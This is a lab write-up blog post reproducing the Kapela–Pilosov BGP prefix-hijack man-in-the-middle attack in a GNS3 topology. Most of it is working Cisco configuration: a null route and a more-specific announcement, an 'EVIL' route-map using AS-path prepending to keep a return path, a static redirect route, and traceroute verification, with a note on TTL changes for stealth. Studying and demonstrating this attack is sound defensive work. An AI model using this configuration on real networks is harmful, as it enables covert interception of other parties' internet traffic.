---
title: 'BGP man in the middle (Kapela & Pilosov)'
date: 2013-03-13T22:17:56+00:00
author: burningnode
layout: post
categories: post
tags:
  - bgp
  - internet
  - internetwork
  - kapela pilosov
  - man in the middle
  - mitm
  - security
draft: false
---
Back in 2008 at DEFCON16, Tony Kapela and Alex Pilosov presented an interesting BGP attack : _an internet scale man in the middle_.

BGP security is interesting and there are numerous techniques, technologies and protocols to make internet routing more secure. However the problem depicted here remains unsolved. IETF is working on a solution called BGPsec to protect the path (the propagation of the route). Anyway BGPsec is in its early days, let&#8217;s focus on the attack.

In this lab I will use the following GNS3 topology. Configuration files will be available at the end of this post.

![BGP-MiTM-KP](/BGP-MiTM-KP.jpg)

The attack is not revolutionary in itself and is based on well-known techniques  
&#8211; Fake announce (static route to null interface + network statement)  
&#8211; Fake origin / reply path (AS preprending feature)

The goal of this attack is not a denial of service but a man in the middle. It is far more stealth as the traffic still reaches its legitimate destination. It is more difficult to detect, only the AS path through which the packets will go change.

Recall that BGP  
&#8211; will always prefer the most specific prefixes whatever the AS Path is,  
&#8211; does not validate route origin (and even if it does with RPKI/ROA, it would be fooled with _AS preprend_)

The goal of the attack is  
&#8211; place ourselves between the target AS and one or more ASes to sniff the traffic  
&#8211; keep a return path to go back to the target AS. Every ASes on the path must be left unmodified.

The attack consists in announcing a more specific prefix than the one advertised by the target AS to the internet, so the internet will go through the attacker AS to reach the legitimate AS.  
Then you will need to keep a path to talk with the legitimate AS, and redirect the traffic to it. Finally you can modify the TTL to be definitely stealthier.


**STEP 1 &#8211; Fake announcements**

Creation of the null route and installation in BGP

```
ip route 4.4.4.0 255.255.255.248 Null0

router bgp 666
 no synchronization
 bgp log-neighbor-changes
 network 4.4.4.0 mask 255.255.255.248
```

![BGP-MiTM-KP-step-1](/BGP-MiTM-KP-step-1.jpg)


**STEP 2 &#8211; Redirection**

Identify your reply path to the target

```
R1#sh ip bgp
...
*  4.4.4.0/24       12.12.12.2                             0 7 6 1 i
*&gt;                  19.19.19.9                             0 2 1 i
*                   16.16.16.6                             0 3 4 1 i
```

Fake the origin and make the routers on the return path deny the prefix (because there will be their ASN in the AS Path, and AS Path is a loop prevention mechanism)

```
ip access-list standard EVIL
 permit 4.4.4.0 0.0.0.7

route-map EVIL permit 10
 match ip address EVIL
 set as-path prepend 2 1

route-map EVIL permit 100

router bgp 666
 neighbor 12.12.12.2 route-map EVIL out
 neighbor 16.16.16.6 route-map EVIL out
 neighbor 19.19.19.9 route-map EVIL out
```

So we can check on R2 (not on the reply path)

```
R2#sh ip bgp
   Network          Next Hop            Metric LocPrf Weight Path
...
*&gt; 4.4.4.0/29       12.12.12.1               0             0 666 2 1 i
```

And R9 on the reply path

```
R9#sh ip route | i 4.4.4
B       4.4.4.0 [20/0] via 94.94.94.4, 00:23:39
```

Everything is good up to this point.

Now we need to redirect the traffic towards the real path in order to make it reach its legitimate destination (while we keep looking at it).  
To do so, install a static route with the first router of the reply path as next hop (on R1).

```
ip route 4.4.4.4 255.255.255.255 19.19.19.9
```

![BGP-MiTM-KP-step2](/BGP-MiTM-KP-step2.jpg)


**STEP 3 &#8211; Verification**

We can check on R8

```
R8#traceroute 4.4.4.4 so lo 0

Type escape sequence to abort.
Tracing the route to 4.4.4.4

  1 68.68.68.6 16 msec 16 msec 20 msec
  2 16.16.16.1 20 msec 32 msec 24 msec ==&gt; R1 - AS666
  3 19.19.19.9 36 msec 36 msec 40 msec
  4 94.94.94.4 72 msec *  76 msec
```

You&#8217;re done!


**STEP 4 &#8211; TTL**

The TTL modification is handled by a Linux box inside the AS. It is done using iptables TTL manipulations features (<a title="man iptables" href="http://ipset.netfilter.org/iptables.man.html" target="_blank">man iptables</a>).

[Download the configuration files](/BGP-MiTM-configs.zip)


**Links**

DEFCON16 Kapela-Pilosov video: [http://www.youtube.com/watch?v=S0BM6aB90n8](http://www.youtube.com/watch?v=S0BM6aB90n8)  
DEFCON16 Kapela-Pilosov slides: [http://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-pilosov-kapela.pdf](http://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-pilosov-kapela.pdf)